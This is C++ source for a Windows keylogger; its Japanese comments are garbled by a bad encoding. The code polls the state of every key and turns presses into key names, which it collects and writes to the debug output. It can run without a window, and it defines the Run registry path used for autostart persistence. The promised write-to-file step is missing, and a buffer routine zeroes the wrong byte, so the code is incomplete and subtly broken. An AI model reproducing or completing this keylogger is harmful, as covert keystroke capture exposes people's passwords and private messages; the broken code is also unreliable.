

//
// �L�[�{�[�h�Ď�
//


#include <windows.h>
#include <stdio.h>
#include <stack>
#include <vector>

template<class T> class stacks {
protected:
	std::stack<T*> c;

public:
	// �f�X�g���N�^
	~stacks(){
		while(c.size()) pops();
	}

	void	pops()					{
		delete[] c.top();
		c.pop();
	}
	void	pushs(T *t, int size_t)	{
		c.push(new T[size_t+1]);
		memcpy(c.top(), t, size_t);
		memset(c.top(), 0, 1);
	}
	T*		tops()					{
		return c.top();
	}
	int		sizes(){
		return c.size();
	}
};

#define	REG_RUN		"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
#define	KEYS_LIMIT	10

// �v���g�^�C�v�錾
void KeyboardWatch();

// �O���[�o���ϐ�
stacks<char> g_keys;
static BYTE s_keya[256], s_keyb[256];

int __stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nCmd){
	if (!(nCmd & SW_HIDE)) {
		AllocConsole();
		FILE *fp;
		freopen_s(&fp, "CON", "w", stdout);    // �W���o�͂̊��蓖��
	
		printf("KeyboardWatcher �N��\n\n");
		printf("�I�����鎞�� Ctrl+[Z]+[A]+[Q] �������Ă�������\n");
		printf("���s����ɂ� [A] �������Ă�������...\n");

		while(1) if (GetAsyncKeyState('A')) break;

		fclose(fp);
		FreeConsole();
	}

	// ������
	for(int i=0; i<256; i++) { s_keya[i] = 0; s_keyb[i] = 0; }

	// ���C��
	while(1) {
		if ((GetAsyncKeyState(17)) & (GetAsyncKeyState('Z')) & (GetAsyncKeyState('A')) & (GetAsyncKeyState('Q'))) break;
		KeyboardWatch();
		if (g_keys.sizes() > KEYS_LIMIT) {
			// ������x�L�[�R�[�h�����܂�����t�@�C���ɏ�������
			while(g_keys.sizes()){
				g_keys.pops();
			}
		}
		Sleep(1);
	}

	return 0;
}

// �L�[�{�[�h�Ď�
void KeyboardWatch(){
	std::stack<BYTE> kcode;	// ������Ă���L�[�R�[�h

	for(int i=1; i<128; i++) if (GetAsyncKeyState(i)) s_keya[i] = true;
	for(int i=1; i<128; i++) if ((s_keyb[i]) && (!s_keya[i])) kcode.push(i);
	for(int i=1; i<128; i++) {s_keyb[i] = s_keya[i];}

	UINT nScanCode;
	bool b = true;
	for(int i=0; kcode.size(); i++) {
		nScanCode = MapVirtualKey(kcode.top(), 0);
		if (nScanCode) {// �L�[�R�[�h���擾
			switch(kcode.top()) {
			case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
			case VK_PRIOR: case VK_NEXT: case VK_END: case VK_HOME:
			case VK_INSERT: case VK_DELETE: case VK_DIVIDE: case VK_NUMLOCK:
				nScanCode |= 0x100; break;
			}
			char buf[256];
			if (GetKeyNameText(nScanCode << 16, buf, sizeof(buf))){
				if (b) {// ��؂蕶���R�[�h�}��
					g_keys.pushs("|", 1);
					b = false;
				}
				// �L�[�R�[�h���R�s�[
				g_keys.pushs(buf, lstrlen(buf));
				OutputDebugString("�L�[");
				OutputDebugString(buf);
			}
		}
		kcode.pop();
	}
}

